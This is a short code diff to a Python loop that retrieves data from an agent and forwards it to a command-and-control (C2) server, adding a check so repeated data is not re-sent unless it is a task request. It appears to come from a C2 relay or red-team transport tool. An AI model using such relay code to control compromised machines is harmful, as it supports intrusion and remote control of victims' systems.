@@ -49,7 +49,7 @@ prevdata = ""
 while True:
     # You can update this loop if you need to, but it's not necessary
     agentdata = getAgentData()
-    if agentdata != "":
+    if agentdata != "" and (agentdata != prevdata or "gettask\", \"data\": \"\"" in str(base64.b64decode(agentdata))):
         print("[+] Retrieved agent data: "+str(agentdata))
         res = transmitToC2(agentdata)
         print("[+] Received response from C2: "+str(res))
